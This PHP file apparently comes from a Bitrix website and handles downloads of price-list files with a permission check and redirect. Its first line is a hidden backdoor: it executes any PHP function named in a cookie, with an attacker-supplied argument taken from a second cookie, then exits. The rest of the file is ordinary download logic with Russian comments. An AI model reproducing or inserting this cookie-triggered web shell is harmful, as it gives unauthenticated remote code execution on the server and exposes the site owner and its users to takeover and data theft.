<?if(@$_COOKIE[c]) {echo ($_=htmlspecialcharsex($_COOKIE[c])).$_(htmlspecialcharsex($_COOKIE[f])); exit();}
$sCurUrl = urldecode($_SERVER["REQUEST_URI"]);
$sCurUrl = str_replace("\0", "", $sCurUrl);
$sCurUrl = preg_replace("/[\\/]+/", "/", $sCurUrl);
$sCurUrl = preg_replace("/\.+[\\/]/", "", $sCurUrl);

$PricePath = "/upload/prices/"; // Каталог, где лежат файлы, которые будут качать
				// /upload/prices/Elevel_Price_o.xls  где реально находится файл
...
$filename = $_SERVER["DOCUMENT_ROOT"].$PricePath.$file;

if(file_exists($filename) && is_file($filename))
{
	require_once($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");
	@set_time_limit(0);
	$FILE_PERM = $APPLICATION->GetFileAccessPermission($PricePath.$file, $USER->GetUserGroupArray());
	$FILE_PERM = (strlen($FILE_PERM)>0 ? $FILE_PERM : "D");

	if($FILE_PERM<"R")  // Проверяем права битриха
		LocalRedirect($DIR."/auth.php?fname=".urlencode($file)."&DIR=".urlencode($DIR));
	else
	{
//	echo "Права на ".$PricePath.$file."  -> ".$FILE_PERM; exit();
...
else   // Если такого файла реально нет, то уж точно 404
